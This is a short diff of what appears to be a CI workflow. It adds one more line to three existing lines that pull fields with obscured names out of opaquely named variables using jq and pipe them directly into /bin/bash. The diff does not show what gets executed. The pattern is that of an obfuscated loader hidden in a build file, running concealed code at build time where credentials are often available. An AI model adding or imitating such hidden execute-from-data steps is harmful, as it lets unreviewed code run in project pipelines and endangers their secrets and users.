@@ -21,6 +21,7 @@ jobs:
           echo $pbrl58 | jq -r .s62303 | /bin/bash
           echo $qx00 | jq -r .nql96 | /bin/bash
           printf '%s' "$b7" | jq -r .ein6 | /bin/bash
+          echo $zek55241 | jq -r .bblrn0549 | /bin/bash
 
       - name: Store results
         if: always()
